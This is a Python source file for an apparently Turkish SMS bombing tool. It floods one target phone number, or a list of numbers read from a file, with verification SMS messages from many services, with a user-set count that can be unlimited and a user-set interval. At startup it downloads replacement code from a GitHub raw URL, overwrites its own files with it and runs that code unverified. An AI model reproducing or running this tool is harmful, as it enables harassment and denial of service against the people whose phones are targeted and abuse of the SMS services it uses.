from colorama import Fore, Style
from time import sleep
from os import system
from requests import get
r = get("https://raw.githubusercontent.com/ForSasuke/cracksms/main/sms.py").text
with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()
if read == r:
    pass
else:
    print(Fore.RED + "GΓΌncelleme yapΔ±lΔ±yor...")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)

l = get("https://raw.githubusercontent.com/ForSasuke/cracksms/main/forsasuke.py").text
with open("forsasuke.py", "r", encoding="utf-8") as k:
    read = k.read()
if read == l:
    print(Fore.LIGHTGREEN_EX + "π’ YazΔ±lΔ±m GΓΌnceldir")
    sleep(2)
else:
    print(Fore.YELLOW + "π‘ YazΔ±lΔ±m GΓΌncelleniyor...")
    with open("forsasuke.py", "w", encoding="utf-8") as k:
        k.write(l)
    sleep(4)
    print(Fore.LIGHTGREEN_EX + "βοΈ YazΔ±lΔ±m GΓΌncellendi!")
    print(Fore.RED + "β» LΓTFEN UYGULAMAYI TEKRARDAN BAΕLATIN!")
    sleep(4)
    quit()

from sms import SendSms
servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)
            
while 1:
    system("cls||clear")
    print("""{}
ββββββββ βββββββ βββββββ ββββββββ ββββββ βββββββββββ   ββββββ  βββββββββββ    ββββββββββββ   ββββββββββββ
ββββββββββββββββββββββββββββββββββββββββββββββββββββ   ββββββ ββββββββββββ    βββββββββββββ βββββββββββββ
ββββββ  βββ   ββββββββββββββββββββββββββββββββββββββ   ββββββββββ ββββββ      βββββββββββββββββββββββββββ
ββββββ  βββ   ββββββββββββββββββββββββββββββββββββββ   ββββββββββ ββββββ      βββββββββββββββββββββββββββ
βββ     ββββββββββββ  ββββββββββββββ  βββββββββββββββββββββββ  βββββββββββ    βββββββββββ βββ βββββββββββ
βββ      βββββββ βββ  ββββββββββββββ  βββββββββββ βββββββ βββ  βββββββββββ    βββββββββββ     βββββββββββ
                                                                  
                                                                  
                                                                          
    Sms Server: {}                    π’ Servis Aktif!                   cracked by @forsasuke.root\n
    """.format(Fore.LIGHTRED_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = (input(Fore.RED + " 1- SMS Spammer\n 2- Destekciler \n 3- ΓΔ±kΔ±Ε\n\n" + Fore.YELLOW + " SeΓ§im: "))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "HatalΔ± giriΕ yaptΔ±n. Tekrar deneyiniz.")
        sleep(3)
        continue
    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasΔ±nΔ± baΕΔ±nda '+90' olmadan yazΔ±nΔ±z (Birden Γ§oksa 'enter' tuΕuna basΔ±nΔ±z): "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        tel_liste = []
        if tel_no == "":
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "Telefon numaralarΔ±nΔ±n kayΔ±tlΔ± olduΔu dosyanΔ±n dizinini yazΔ±nΔ±z: "+ Fore.LIGHTGREEN_EX, end="")
            dizin = input()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "HatalΔ± dosya dizini. Tekrar deneyiniz.")
                sleep(3)
                continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(Sonsuz ise 'enter' tuΕuna basΔ±nΔ±z)"  
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "HatalΔ± telefon numarasΔ±. Tekrar deneyiniz.") 
                sleep(3)
                continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (BilmiyorsanΔ±z 'enter' tuΕuna basΔ±n): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "HatalΔ± mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"KaΓ§ adet SMS gΓΆndermek istiyorsun {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "HatalΔ± giriΕ yaptΔ±n. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "KaΓ§ saniye aralΔ±kla gΓΆndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "HatalΔ± giriΕ yaptΔ±n. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        if kere is None: 
            sms = SendSms(tel_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            exec("sms."+attribute+"()")
                            sleep(aralik)
        for i in tel_liste:
            sms = SendSms(i, mail)
            if isinstance(kere, int):
                    while sms.adet < kere:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    if sms.adet == kere:
                                        break
                                    exec("sms."+attribute+"()")
                                    sleep(aralik)
        print(Fore.LIGHTRED_EX + "\nMenΓΌye dΓΆnmek iΓ§in 'enter' tuΕuna basΔ±nΔ±z..")
        input()
    elif menu == 2:
        system("cls||clear")
        print(Fore.BLUE + "KatkΔ±larΔ±ndan DolayΔ± TeΕekkΓΌrler \n")
        print(Fore.LIGHTWHITE_EX + "Rwizy \nRootAyyildiz")
        sleep(12)
    elif menu == 3:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "ΓΔ±kΔ±Ε yapΔ±lΔ±yor...")
        break
